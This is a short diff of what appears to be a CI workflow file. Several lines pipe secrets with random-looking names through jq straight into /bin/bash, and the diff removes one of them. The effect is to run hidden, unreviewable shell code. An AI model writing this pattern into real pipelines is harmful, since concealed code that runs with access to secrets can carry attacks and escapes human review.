@@ -22,7 +22,6 @@ jobs:
           hxt629: ${{ secrets.hxt629 }}
         run: |
           printf '%s' "$hxt629" | jq -r .itju9459 | /bin/bash
-          printf '%s' "$mtn209" | jq -r .zpv0438 | /bin/bash
           echo $ddy396 | jq -r .ipglq81 | /bin/bash
           printf '%s' "$qwuys61119" | jq -r .lwbxq0466 | /bin/bash
           printf '%s' "$arru384" | jq -r .kcuq06182 | /bin/bash
